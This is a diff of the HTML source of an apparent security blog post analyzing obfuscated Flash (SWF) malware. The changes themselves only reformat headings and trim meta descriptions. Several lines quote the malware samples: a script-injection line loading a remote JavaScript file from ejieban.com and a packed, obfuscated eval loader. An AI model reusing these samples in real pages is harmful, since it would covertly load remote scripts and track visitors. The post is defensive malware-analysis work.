@@ -10,7 +10,7 @@
     content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
 The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
 document.write(unescape(&amp;quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&amp;quot;));  Digging deeper:
-eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&amp;gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&amp;quot;V&amp;quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&amp;quot;1u&amp;quot;);6.w.o=&amp;quot;0&amp;quot;;6.w.j=&amp;quot;0&amp;quot;;6.w.1G=&amp;quot;1M&amp;quot;;6.w.29=&amp;quot;-2d&amp;quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3." />
+eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&amp;gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&amp;quot;V&amp;quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&amp;quot;1u&amp;quot;);6.w.o=&amp;quot;0&amp;quot;;6.w.j=&amp;quot;0&amp;quot;;6.w.1G=&amp;quot;1M&amp;quot;;6.w.29=&amp;quot;-2d&amp;quot;;6.1p=h;1j 6};3." />
 <meta name="keywords" content="blog,security,research,vulnerabilities,cve,malware,reverse engineering,malware analysis" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="/post/analyzing-obfuscated-swfs/" />
@@ -43,7 +43,7 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt
 <meta itemprop="description" content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
 The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
 document.write(unescape(&quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&quot;));  Digging deeper:
-eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3.">
+eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.">
 
 
 <meta itemprop="datePublished" content="2016-10-09T13:18:17&#43;00:00" />
@@ -60,7 +60,7 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a
 <meta name="twitter:description" content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
 The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
 document.write(unescape(&quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&quot;));  Digging deeper:
-eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3."/>
+eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3."/>
 
 
 
@@ -136,7 +136,9 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a
             
 
             <div class="post-content">
-                <p>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.</p>
+                
+
+<p>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.</p>
 
 <p>The host in question was seen contacting NovaSyncs.com which was serving malicious JS via <code>mine.js</code>:</p>
 
@@ -241,7 +243,7 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a
     })
 </code></pre>
 
-<p>Unpacking the SWF for analysis</p>
+<h2 id="unpacking-the-swf-for-analysis">Unpacking the SWF for analysis</h2>
 
 <p>The ejieban.com <code>stat.swf</code> file looks to be encoded with DComSoft&rsquo;s SWF Protector. This is essentially an encoder designed to protect flash bytecode from analysis.</p>
 
@@ -275,7 +277,7 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a
 
 <p>I can see references to the <code>SSetter</code> class that threw the earlier exception in Firefox; this must be the decoded SWF. The object can be saved to disk for further analysis.</p>
 
-<p>Analyzing the Deobfuscated Code</p>
+<h2 id="analyzing-the-deobfuscated-code">Analyzing the Deobfuscated Code</h2>
 
 <p>The decoded SWF uses a <code>BaseCoder</code> class which appears to be a base64 encoding/decoding routine with a custom character table:</p>
 
@@ -646,7 +648,7 @@ if (&quot;undefined&quot; == typeof(_c1oud3r)) {
 }
 </code></pre>
 
-<p>Conclusions</p>
+<h2 id="conclusions">Conclusions</h2>
 
 <p>This piece of malware does not appear to attempt privilege escalation or PE payload download (ala Neutrino EK). Its primary purpose appears to be tracking via <code>cnzz.com</code> and <code>ejieban.com</code> using <code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>, Flash <code>&lt;object&gt;</code> injection.</p>
 
